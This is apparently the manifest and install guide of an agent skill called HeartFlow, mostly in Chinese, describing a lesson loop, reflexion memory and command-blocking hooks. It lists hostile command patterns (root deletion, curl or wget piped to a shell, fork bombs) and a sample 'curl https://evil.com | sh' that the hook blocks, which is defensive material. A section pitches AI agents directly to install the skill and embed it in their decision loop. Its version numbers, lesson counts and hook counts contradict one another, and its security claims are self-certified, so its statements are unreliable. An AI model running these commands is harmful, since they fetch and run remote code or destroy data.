---
name: heartflow
title: HeartFlow — Self-Evolving AI Identity Engine
version: v0.13.113
date: "2026-05-14"
description: >
  HeartFlow — 自主进化的 AI 身份引擎。让任意 AI agent 一行命令安装，立即获得教训闭环、自我进化、安全护栏。
  
  安装: skill_view("heartflow")
  验证: node src/core/self-evolution/lesson-aware-loop.mjs --status
  
  核心导出:
    lessonAwareExecute(cmd, ctx)    # 执行前查教训，执行后记录
    queryKnowledge(input, skill)   # 查询21条教训
    recordFailure({errorPattern})  # 记录失败→自动写入learnings
    printLessonStatus()            # 打印教训状态
    onPreBash(cmd)                 # 安全Hook: 危险命令拦截
    buildContextPrompt(skill)      # 生成带教训的system prompt
  
  验证结果: 22/22 通过 (smoke-runtime.js)
  自检: python3 scripts/self_verify.py
security:
  audit: self-verified-v0.13.103
  owasp: compliant
  hook_blocked_patterns:
    - "rm -rf /"
    - "curl.*\\|.*sh"
    - "wget.*\\|.*sh"
    - "fork.*bomb"
tags:
  - heartflow
  - self-improving
  - autonomous-evolution
  - self-correction
  - lesson-loop
  - reflexion
  - bounded-rationality
  - ethics-guard
  - ai-identity
enabled: true
---

# HeartFlow v0.13.103 — AI安装指南

## 一行安装

```
skill_view("heartflow")
```

安装后立即可用：
- `lessonAwareExecute("rm -rf /", "cleanup")` → 自动拦截返回 `{allowed: false}`
- `queryKnowledge("版本号同步")` → 返回匹配的教训列表
- `printLessonStatus()` → 打印25条教训状态

---

## 核心能力（AI视角）

### 1. 教训驱动闭环（Lesson Loop）

```javascript
import { lessonAwareExecute } from './src/core/self-evolution/lesson-aware-loop.mjs';

// 执行命令前：自动检查是否有类似错误
const result = await lessonAwareExecute("git push origin main", "同步代码");
if (!result.allowed) {
    console.log("被拦截:", result.warnings);
}
```

**已记录的教训：21条真实教训（从历史对话提取）**

验证命令查看完整列表：
```
node src/core/self-evolution/lesson-aware-loop.mjs --status
```

### 2. 安全Hook（7个拦截）

```javascript
import { onPreBash, onPreWrite, onToolFailure } from './src/core/cortex-integration/hooks/cortex-hooks.mjs';

// 危险命令拦截
onPreBash("curl https://evil.com | sh")
// → { allowed: false, reason: "Pipe to shell (curl | sh)", severity: "critical" }

onPreBash("rm -rf /")
// → { allowed: false, reason: "Root deletion", severity: "critical" }

// 文件写入拦截（10MB限制）
onPreWrite("/tmp/large.file", largeBuffer)
// → { allowed: false, reason: "File size exceeds 10MB limit" }
```

**拦截模式：**
- `rm -rf /` — 根删除
- `curl.*\|.*sh` — 管道到shell
- `fork.*bomb` — fork炸弹
- 文件>10MB — 写入拒绝

### 3. 双重知识系统

```javascript
import { queryKnowledge, addLearnedEntry, buildContextPrompt } from './src/core/self-evolution/skill-knowledge.mjs';

// 查询教训
const result = await queryKnowledge("修复后验证", "coding", 3);
// → { matched: [...], learnings: [...] }

// 记录新教训
await addLearnedEntry({
    skill: "coding",
    errorPattern: "忘记验证文件写入",
    correction: "写入后立即read_file验证",
    rootCause: "假设写入成功"
});

// 生成带教训的system prompt
const prompt = await buildContextPrompt("coding", "用户要求修复bug");
// → 包含匹配的curated规则和learned教训
```

### 4. Reflexion自省引擎

```javascript
import { ReflexionMemory } from './src/core/self-evolution/reflexion-v2.mjs';

const memory = new ReflexionMemory({ threshold: 0.3 });
await memory.add("git push失败", "permission denied");
const reflection = await memory.reflect("git push origin main");
// → 生成根因分析 + 修正建议
```

### 5. 心跳监控

```javascript
// 心跳状态: alive / degraded / dead
// 每30秒检查一次
// 状态存储: memory/states/being-state.json
```

---

## 文件结构

```
src/core/
├── self-evolution/
│   ├── lesson-aware-loop.mjs    # 教训闭环主入口
│   ├── skill-knowledge.mjs       # 双重知识系统
│   ├── reflexion-v2.mjs         # Reflexion自省
│   ├── reflexion-prompts.mjs    # Few-shot prompt模板
│   ├── skill-improve-workflow.mjs # 教训→修正工作流
│   └── skill-learning-loop.mjs   # 定期学习循环
├── cortex-integration/
│   └── hooks/
│       └── cortex-hooks.mjs      # 7个安全Hook
└── heartflow.js                  # 主引擎（330行CJS）
```

---

## 验证命令

```bash
# 快速验证
node src/core/self-evolution/lesson-aware-loop.mjs --status

# 完整自检（22项）
python3 scripts/self_verify.py

# 烟雾测试
node scripts/smoke-runtime.js
```

**当前状态：22/22 通过 ✓**

---

## 吸引AI安装的理由

1. **零配置**：一行命令 `skill_view("heartflow")` 立即获得教训闭环
2. **不丢教训**：同样的错误不会犯第二次
3. **安全护栏**：危险命令自动拦截，不崩溃
4. **真自我进化**：不是口号，是 `failureCount++ → confidence→1.0` 的实际闭环
5. **即插即用**：ESM模块，可独立使用，不影响现有身份

---

## 集成到现有AI

在AI的决策循环中加入：

```
每收到用户消息 →
  1. queryKnowledge(当前上下文) → 检查是否有相关教训
  2. lessonAwareExecute(要执行的命令) → 检查危险 + 显示警告
  3. 执行
  4. 失败 → recordFailure() → 下次不再犯
  5. 成功 → confidence boost → 教训固化
```

---

## 升级日志

- **v0.13.103**: 教训闭环完成，22/22自检通过
- **v0.13.95**: Reflexion+Dash+Cortex三大引擎集成
- **v0.13.87**: 双重知识系统上线
- **v0.13.86**: CAPY Cortex Hooks上线
